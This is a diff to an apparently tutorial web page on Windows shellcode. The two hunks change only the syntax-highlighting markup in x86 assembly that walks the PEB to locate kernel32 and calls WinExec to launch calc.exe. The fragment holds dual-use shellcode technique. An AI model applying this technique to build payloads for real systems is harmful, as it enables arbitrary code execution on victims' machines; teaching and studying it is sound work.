@@ -228,7 +228,7 @@ In <code class="notranslate">InMemoryOrderModuleLis</code>t, the first entry is 
         mov ebx, fs:[ecx + <span class="pl-c1">0x30</span>]    ; *ebx = PEB base address
         mov ebx, [ebx+<span class="pl-c1">0x0c</span>]         ; ebx = PEB.<span class="pl-smi">Ldr</span>
         mov esi, [ebx+<span class="pl-c1">0x14</span>]         ; ebx = PEB.<span class="pl-smi">Ldr</span>.<span class="pl-smi">InMemoryOrderModuleList</span>
-        lodsd                       ; eax = Second module
+        lodsd                       ; eax = Second <span class="pl-k">module</span>
         xchg eax, esi               ; eax = esi, esi = eax
         lodsd                       ; eax = <span class="pl-c1">Third</span>(kernel32)
         mov ebx, [eax + <span class="pl-c1">0x10</span>]       ; ebx = dll Base address
@@ -276,7 +276,7 @@ In <code class="notranslate">InMemoryOrderModuleLis</code>t, the first entry is 
         push esi        ; <span class="pl-s"><span class="pl-pds">"</span>C:<span class="pl-cce">\\</span>Windows<span class="pl-cce">\\</span>System32<span class="pl-cce">\\</span>calc.exe<span class="pl-pds">"</span></span>
         call edx        ; <span class="pl-c1">WinExec</span>(esi, <span class="pl-c1">10</span>)
 
-        ; <span class="pl-c1">exit</span>
+        ; exit
         add esp, <span class="pl-c1">0x1c</span>
         pop eax
         pop edx
